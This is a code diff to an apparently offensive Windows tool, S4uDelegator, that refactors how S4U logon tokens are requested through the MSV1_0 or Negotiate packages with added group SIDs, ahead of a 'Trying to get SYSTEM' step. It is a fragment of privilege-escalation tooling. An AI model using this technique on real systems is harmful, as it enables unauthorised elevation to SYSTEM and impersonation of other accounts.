@@ -14,7 +14,7 @@ namespace S4uDelegator.Library
             string sid,
             string[] extraSids)
         {
-            var groupSids = new string[] { };
+            List<string> groupSids;
 
             if (string.IsNullOrEmpty(domain))
                 domain = Environment.MachineName;
@@ -32,6 +32,8 @@ namespace S4uDelegator.Library
 
             if (extraSids.Length > 0)
                 groupSids = VerifyGroupSids(extraSids);
+            else
+                groupSids = new List<string>();
 
             Console.WriteLine("[>] Trying to get SYSTEM.");
 
@@ -68,21 +70,29 @@ namespace S4uDelegator.Library
             bool status;
             IntPtr hImpersonationToken;
             IntPtr hPrimaryToken;
+            LSA_STRING pkgName;
+            TOKEN_SOURCE tokenSource;
 
             if (string.IsNullOrEmpty(upn))
             {
-                hPrimaryToken = Utilities.GetMsvS4uLogonToken(
+                pkgName = new LSA_STRING(Win32Consts.MSV1_0_PACKAGE_NAME);
+                tokenSource = new TOKEN_SOURCE("User32");
+                hPrimaryToken = Utilities.GetS4uLogonToken(
                     username,
                     domain,
-                    SECURITY_LOGON_TYPE.Network,
+                    in pkgName,
+                    in tokenSource,
                     groupSids);
             }
             else
             {
-                hImpersonationToken = Utilities.GetKerbS4uLogonToken(
+                pkgName = new LSA_STRING(Win32Consts.NEGOSSP_NAME_A);
+                tokenSource = new TOKEN_SOURCE("NtLmSsp");
+                hImpersonationToken = Utilities.GetS4uLogonToken(
                     username,
                     domain,
-                    SECURITY_LOGON_TYPE.Network,
+                    in pkgName,
+                    in tokenSource,
                     groupSids);
 
                 if (hImpersonationToken == IntPtr.Zero)
@@ -340,7 +350,7 @@ namespace S4uDelegator.Library
         }
 
 
-        private static string[] VerifyGroupSids(string[] groupSids)
+        private static List<string> VerifyGroupSids(string[] groupSids)
         {
             var result = new List<string>();
             string accountName;
@@ -386,7 +396,7 @@ namespace S4uDelegator.Library
                 }
             }
 
-            return result.ToArray();
+            return result;
         }
     }
 }
